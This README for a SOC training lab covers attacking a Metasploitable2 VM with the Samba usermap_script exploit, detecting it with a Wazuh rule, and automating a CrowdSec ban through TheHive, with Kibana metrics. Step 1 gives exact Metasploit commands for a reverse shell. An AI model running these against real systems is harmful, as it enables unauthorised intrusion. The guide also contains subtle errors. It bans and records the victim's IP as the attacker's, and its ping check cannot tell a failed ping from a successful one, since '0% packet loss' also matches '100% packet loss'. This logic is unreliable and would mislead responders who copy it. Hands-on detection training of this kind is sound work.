# SOC Capstone: Comprehensive Incident Response Lab

**Purpose:** This repository documents a hands-on SOC capstone lab where we simulate a targeted exploitation, detect it, triage and automate response, perform post-incident analysis, and produce metrics and reports. It’s written as a step‑by‑step guide for a new person to reproduce the exercise in an isolated lab environment.

---

## Contents

* `README.md` (this file)
* `wazuh/` — Wazuh rule examples and ingestion notes
* `thehive/` — TheHive case template + playbook samples
* `crowdsec/` — cscli examples and API curl commands
* `caldera/` — suggested adversary/ability descriptions
* `metasploit/` — exact msfconsole commands to run the exploit
* `kibana/` — runtime fields and dashboard panel definitions
* `reports/` — SANS-style 300-word report and 150-word executive briefing

---

## Lab topology (recommended)

```
[Attacker Kali (optional)]    [Your workstation]
          |                         |
      [Switch/Bridge]------------[WSL Ubuntu - Wazuh Manager + Indexer + (CrowdSec engine optional)]
          |                         |
    [Raspberry Pi - Kali - Wazuh agent + Caldera]  <--->  [Metasploitable2 VM (target)]
                      |
                 [TheHive + Cortex] (on WSL or separate VM)
                      |
                 [CrowdSec bouncers] (on gateway/WSL/Raspberry Pi)
```

**IP examples used in the guide:**

* Target (Metasploitable2): `192.168.1.102`
* Wazuh manager / WSL host: your host IP (replace `<WSL_IP>`)
* Raspberry Pi agent: `192.168.1.150` (example)

> Replace IPs to fit your environment. This guide assumes an isolated lab network — DO NOT run exploits on production/internet-connected systems.

---

## Prerequisites

* A machine to act as Wazuh manager + Elastic indexer (WSL Ubuntu is acceptable for a lab; a dedicated Ubuntu VM is preferred). Ensure Elastic and Kibana are installed and the Wazuh manager is connected to the indexer.
* Raspberry Pi 4 with Kali Linux that has the Wazuh agent installed and MITRE Caldera installed (or a Kali VM).
* Metasploitable2 VM on the same network as the Raspberry Pi or Kali host.
* Docker / Docker Compose available if you will install TheHive and Cortex via Docker.
* Basic familiarity with `msfconsole`, `curl`, `cscli`, `nc`, `ping`, and editing config files.

---

## High-level workflow

1. Simulate an exploit against Metasploitable2 using Metasploit and record `attack_start` timestamp.
2. Emulate TTPs with Caldera (T1210 — Exploitation of Remote Services).
3. Detect the exploit using Wazuh — custom rule provided.
4. Triage the alert in TheHive; automate response via a TheHive playbook that calls CrowdSec.
5. Use CrowdSec to add a ban decision for the attacker IP and verify reachability is blocked.
6. Preserve evidence and isolate the VM.
7. Compute MTTD, MTTR, and dwell time in Kibana using runtime fields and build a dashboard.
8. Perform RCA (5 Whys + Fishbone) and write reports for technical and executive audiences.

---

## Step 1 — Attack simulation (Metasploit)

**Commands (run on Kali):**

```bash
# Start Metasploit
msfconsole

# Use the Samba usermap_script exploit
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.1.102
set RPORT 139
set PAYLOAD linux/x86/shell_reverse_tcp
set LHOST <YOUR_KALI_IP>
set LPORT 4444
run
```

**Instructions:**

* Note the exact timestamp when you run `run`; this is `attack_start` and will be used for metrics.
* Capture any console output in a file if you want (copy/paste or `script` command) for evidence.

---

## Step 2 — Adversary emulation (Caldera)

**Goal:** Emulate T1210 (Exploitation of Remote Services). We only need an operation that mimics initial access and a simple shell execution.

**Suggested Caldera choices:**

* Adversary: create or reuse an adversary profile named `lab-T1210`.
* Abilities chain: `InitialAccess -> ExecuteShell -> FileDownload` (or a single ability that executes a harmless `whoami` or `uname -a` on the target).
* Executor: `linux` (or `sh`) depending on your Caldera installation.

**Notes:**

* Start the operation and record `operation_start` timestamp. Ensure Caldera logs are configured to forward telemetry to Wazuh (e.g., syslog or filebeat) if you want Caldera events visible in Elastic.

---

## Step 3 — Wazuh detection rule

Create/append the following to your Wazuh manager `local_rules.xml` (path varies; `/var/ossec/etc/rules/local_rules.xml` is common). Tune `field`/regex to match your environment.

```xml
<group name="local,">
  <rule id="100900" level="10">
    <if_sid>18107</if_sid>
    <decoded_as>json</decoded_as>
    <field name="full_log">.*(usermap_script|unix_smbd:|smbd:).*</field>
    <description>Samba usermap_script exploit attempt detected</description>
    <mitre>
      <technique id="T1210">Exploitation of Remote Services</technique>
    </mitre>
    <options>no_full_log</options>
  </rule>
</group>
```

**Apply & test:**

* Restart Wazuh manager (and agent if needed) and trigger the exploit. Check `alerts.log` or Kibana Wazuh index for the alert.
* If your Wazuh agent produces different log formats, adapt the `<field>` regex to match the actual `full_log` content.

---

## Step 4 — TheHive ingestion & case template

**Ingestion:** Configure Wazuh to forward alerts to TheHive. Two common methods:

* Use TheHive's Wazuh connector or webhook ingestion (if using a bridge or custom script).
* Send alerts from Wazuh manager via a webhook or script that posts to TheHive's API.

**Minimal TheHive case template mapping:**

* Title: `Samba exploit detected — {{rule.name}}`
* Description: include `@timestamp` and `full_log`.
* Observable (Artifact): `ip` — `source.ip` (from Wazuh alert)
* Tag: `mitre:T1210`

**Example TheHive API snippet to create a case (curl):**

```bash
curl -X POST "http://<THEHIVE_HOST>:9000/api/case" \
  -H "Authorization: Bearer <THEHIVE_API_KEY>" \
  -H "Content-Type: application/json" \
  -d '{
    "title":"Samba exploit detected",
    "description":"Wazuh alert: ...",
    "artifacts":[{"data":"192.168.1.102","dataType":"ip"}]
}'
```

Replace with your TheHive host and API key.

---

## Step 5 — TheHive playbook / automation to call CrowdSec

**What it must do:**

1. Extract the attacker IP from the case observable.
2. Call CrowdSec (cscli or API) to add a ban decision for that IP.
3. Add a case note recording the action & timestamp.
4. Optionally run a verification step (ping or `nc`) and add the result to the case.

**Example automation script (bash, invoked by TheHive responder):**

```bash
#!/bin/bash
# Usage: ./block_ip.sh <ip>
IP="$1"
CROWDSEC_HOST="<CROWDSEC_HOST>"
API_KEY="<CROWDSEC_API_KEY>"

curl -s -X POST "http://${CROWDSEC_HOST}:8080/v1/decisions" \
  -H "X-Api-Key: ${API_KEY}" \
  -H "Content-Type: application/json" \
  -d "{\"type\":\"ban\",\"scope\":\"ip\",\"value\":\"${IP}\",\"duration\":\"1h\",\"origin\":\"TheHive\"}"

# Verification
ping -c 3 ${IP} > /tmp/ping_result 2>&1
if grep -q "0% packet loss" /tmp/ping_result; then
  echo "Ping succeeded — block may not be in effect" > /tmp/block_verification
else
  echo "Ping failed — IP likely blocked" > /tmp/block_verification
fi

# Print outputs so TheHive captures logs
cat /tmp/block_verification
```

> Securely store `API_KEY` and ensure the playbook runner has network access to CrowdSec.

---

## Step 6 — CrowdSec commands

**Local CLI (on CrowdSec engine host):**

```bash
# Ban an IP for one hour
sudo cscli decisions add --ip 192.168.1.102 --type ban --duration 1h --reason "Samba exploit"

# List current decisions
sudo cscli decisions list
```

**API (curl):**

```bash
curl -X POST "http://<CROWDSEC_HOST>:8080/v1/decisions" \
  -H "X-Api-Key: <YOUR_API_KEY>" \
  -H "Content-Type: application/json" \
  -d '{"type":"ban","scope":"ip","value":"192.168.1.102","duration":"1h","origin":"TheHive"}'
```

---

## Step 7 — Verification & isolation

**Network verification:**

```bash
# From your management host
ping -c 4 192.168.1.102
nc -vz 192.168.1.102 139
```

**Expected results:**

* After CrowdSec/blocking, `ping` should fail or drop significantly, and `nc` should not connect to port 139.

**Isolation:**

* Snapshot or disconnect the Metasploitable2 VM from the network and collect evidence (logs, memory dump if required). Document timestamps and actions in TheHive case notes.

---

## Step 8 — Kibana: metrics and dashboard

**Goal:** Calculate MTTD, MTTR, and Dwell Time using runtime fields and then display in a dashboard.

**Required timestamps in your events/indexes:**

* `attack.start` — when you launched the exploit (string or date)
* `detection.time` — when Wazuh generated the alert (`@timestamp` commonly)
* `containment.time` — when CrowdSec confirmed the decision or when isolation happened

### Runtime field examples (Painless)

**detection\_latency\_seconds**

```painless
if (doc.containsKey('detection.time') && doc.containsKey('attack.start')) {
  return (doc['detection.time'].value.toInstant().toEpochMilli() - doc['attack.start'].value.toInstant().toEpochMilli())/1000;
}
return null;
```

**response\_time\_seconds**

```painless
if (doc.containsKey('containment.time') && doc.containsKey('detection.time')) {
  return (doc['containment.time'].value.toInstant().toEpochMilli() - doc['detection.time'].value.toInstant().toEpochMilli())/1000;
}
return null;
```

**dwell\_time\_seconds**

```painless
if (doc.containsKey('containment.time') && doc.containsKey('attack.start')) {
  return (doc['containment.time'].value.toInstant().toEpochMilli() - doc['attack.start'].value.toInstant().toEpochMilli())/1000;
}
return null;
```

### Dashboard panels (suggested)

* Single metric: Average `detection_latency_seconds` (display as minutes)
* Single metric: Average `response_time_seconds` (display as minutes)
* Time series: Average detection latency (date histogram on `detection.time`)
* Top 10 attacker IPs by alert count (Terms on `source.ip`)
* Alerts table with columns: `@timestamp`, `source.ip`, `rule.name`, `mitre.technique`

**Which field for Y axis?** Use the runtime field (e.g., `detection_latency_seconds`) with the `Average` aggregation. X axis use a `Date histogram` on `detection.time` or `@timestamp`.

---
